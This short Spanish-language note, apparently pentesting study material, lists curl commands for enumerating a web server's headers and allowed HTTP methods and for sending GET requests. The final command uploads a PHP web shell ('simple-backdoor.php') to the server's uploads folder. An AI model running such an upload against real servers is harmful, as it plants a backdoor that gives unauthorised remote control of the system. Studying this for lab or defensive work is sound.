Podemos enumerar los headers del servidor web con curl:
`curl -v -I http://<ip>`

Ver los métodos HTTP permitidos por el servidor:
`curl -v -X OPTIONS http://<ip>`

Crear GET request:
`curl -X GET http://<ip>/`

Acceder recurso concreto:
`curl -X GET http://<ip>/home`

Subir un fichero:
`curl http://<ip>/uploads --upload-file /usr/share/webshells/php/simple-backdoor.php`